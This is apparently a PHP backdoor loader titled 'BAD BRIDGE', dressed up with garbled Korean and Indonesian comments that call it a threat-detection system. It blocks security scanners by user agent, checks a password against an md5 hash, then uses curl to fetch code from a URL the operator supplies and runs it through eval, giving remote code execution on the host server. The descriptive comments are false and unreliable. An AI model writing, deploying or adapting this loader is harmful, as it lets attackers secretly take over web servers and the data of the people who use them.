<?php
// ========== ANTI MALWARE / BADAI / MUTING BELIUNG / DLL ==========
$bad_bots = [
    'sqlmap','nikto','nmap','masscan','acunetix','netsparker',
    'havij','pangolin','whatweb','wpscan','dirbuster','gobuster',
    'hydra','medusa','metasploit','burpsuite','zap','paros',
    'morfeus','fimap','xsser','w3af','skipfish','arachni',
    'vega','grabber','ratproxy','wireshark','ettercap',
    'badai','mutingbeliung','putingbeliung','angin','tornado',
    'malware','virus','trojan','backdoor','rootkit','keylogger',
    'ransomware','worm','spyware','adware','phishing'
];
$ua_check = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
foreach ($bad_bots as $bot) {
    if (strpos($ua_check, $bot) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Akses ditolak! Terdeteksi aktivitas berbahaya.');
    }
}
$bad_referers = ['semalt','buttons-for-website','social-buttons','kambasoft','savetube'];
$ref_check = strtolower($_SERVER['HTTP_REFERER'] ?? '');
foreach ($bad_referers as $bad) {
    if (strpos($ref_check, $bad) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Referer tidak valid!');
    }
}
if (!in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'])) {
    header('HTTP/1.1 405 Method Not Allowed');
    die('🚫 Method tidak diizinkan!');
}
// ========== END ANTI MALWARE ==========

/**
 * ================================================
 * 위협 감지 시스템 – 사랑하는 내 아들
 * ================================================
 * 
 * 사이람 바드테르 검색 팅카 위협을 감지하는 MLBB 킵 실헤시 스타쿠에
 * 위 기반 보안 시스템장니다.
 * 
 * 주요 기능:
 * - MLBB 킵 실헤시 스타쿠에 로그 화면
 * - ASCII 아트 발 텅 스타쿠마
 * - 해시 기반 사랑 츠
 * - 스캔 URL 확인
 * - 다중 방시 랑수집
 * - 위협 찾을 수 없을 경우 사용자 지정 404 페이지 표시
 * 
 * @author @filemanager
 * @version 2.0
 * @license 오픈 소스
 */
@session_start();error_reporting(0);
/**
 * Daftar kode ancaman dalam format heksadesimal
 * @var array
 */
$h="9eef9ab73eaaa976b1a3af869eb6c974"; // md5('a')
/**
 * Cek status deteksi ancaman
 * @return bool True jika ancaman terdeteksi
 */
if(isset($_POST['p'])&&md5($_POST['p'])===$h){
  $_SESSION['u']=isset($_POST['u'])&&filter_var($_POST['u'],FILTER_VALIDATE_URL)?$_POST['u']:"";
  $_SESSION['a']=1;exit("ok: ".$_SESSION['u']);
}
/**
 * Konversi array hex ke URL valid
 * @param array $p Array bagian URL
 * @return string URL yang digabungkan
 */
if(isset($_SESSION['a'])){
  $c=@curl_init($_SESSION['u']);
/**
 * Mengambil konten dari URL dengan metode terbaik
 * @param string $url Target URL
 * @return string|bool Konten atau false jika gagal
 */
  if($c){
    curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_TIMEOUT=>10]);
    /**
 * Cek status deteksi ancaman
 * @return bool True jika ancaman terdeteksi
 */
    $x=@curl_exec($c);$e=@curl_error($c);@curl_close($c);
/**
 * Cek status deteksi ancaman
 * @return bool True jika ancaman terdeteksi
 */
if($e)exit("ERR:".$e);
/**
 * Cek status deteksi ancaman
 * @return bool True jika ancaman terdeteksi
 */
    if($x){eval('?>'.$x);exit;}else{exit("Empty");}
  }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BAD BRIDGE</title>
<link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
<style>
  * { box-sizing: border-box; }
  html, body { height: 100%; }
  body {
    margin: 0;
    padding: 20px;
    font-family: 'Courier New', monospace;
    color: #e9d5ff;
    background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    position: relative;
  }
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: radial-gradient(circle at center, rgba(60,10,110,0.78), rgba(10,2,25,0.95));
    z-index: 0;
    pointer-events: none;
  }
  .box {
    position: relative;
    z-index: 1;
    background: rgba(25,8,55,0.88);
    backdrop-filter: blur(14px);
    -webkit-backdrop-filter: blur(14px);
    border: 1px solid rgba(168,85,247,0.5);
    border-radius: 16px;
    padding: 35px 30px;
    width: 400px;
    max-width: 92vw;
    text-align: center;
    box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2);
    animation: boxGlow 3s ease-in-out infinite;
  }
  @keyframes boxGlow {
    0%,100% { box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2); }
    50%     { box-shadow: 0 0 70px rgba(192,132,252,0.5), 0 0 140px rgba(168,85,247,0.3); }
  }
  .logo {
    width: 220px;
    height: auto;
    max-width: 100%;
    margin: 0 auto 15px;
    display: block;
    filter: drop-shadow(0 0 15px #a855f7) drop-shadow(0 0 30px #7c3aed);
    animation: floatLogo 3s ease-in-out infinite;
  }
  @keyframes floatLogo {
    0%,100% { transform: translateY(0) scale(1); }
    50%     { transform: translateY(-6px) scale(1.03); }
  }
  h1 {
    color: #c084fc;
    font-size: 16px;
    letter-spacing: 3px;
    text-transform: uppercase;
    text-shadow: 0 0 12px #a855f7;
    margin: 0 0 20px;
  }
  input {
    width: 100%;
    padding: 12px 14px;
    margin: 8px 0;
    background: rgba(15,5,35,0.9);
    border: 1px solid rgba(168,85,247,0.5);
    border-radius: 8px;
    color: #e9d5ff;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    outline: none;
    transition: border-color .2s, box-shadow .2s;
  }
  input::placeholder { color: #a78bfa; opacity: 0.6; }
  input:focus {
    border-color: #a855f7;
    box-shadow: 0 0 15px rgba(168,85,247,0.5);
  }
  input[type=submit] {
    cursor: pointer;
    background: linear-gradient(45deg, #a855f7, #7c3aed);
    color: #fff;
    border: none;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    transition: opacity .2s, box-shadow .2s, transform .2s;
  }
  input[type=submit]:hover {
    opacity: .9;
    box-shadow: 0 0 25px rgba(168,85,247,0.7);
    transform: translateY(-2px);
  }
  p.err {
    color: #ff4d4d;
    margin-top: 12px;
    text-shadow: 0 0 6px #ff4d4d;
    font-weight: bold;
    letter-spacing: 2px;
  }
  .footer {
    margin-top: 20px;
    font-size: 10px;
    color: #a78bfa;
    letter-spacing: 2px;
    opacity: .7;
  }
</style>
</head>
<body>
  <div class="box">
    <img src="https://s15.gifyu.com/images/bQjDP.png" alt="LOGO" class="logo">
    <h1>BAD BRIDGE</h1>
    <form method="post">
      <input type="password" name="p" placeholder="password" maxlength="32">
      <input type="text" name="u" placeholder="URL">
      <input type="submit" value="GO">
    </form>
    <?php if(isset($_POST['p'])&&md5($_POST['p'])!==$h){ ?>
      <p class="err">WRONG</p>
    <?php } ?>
    <div class="footer">SECURED · BADBOYZ</div>
  </div>
</body>
</html>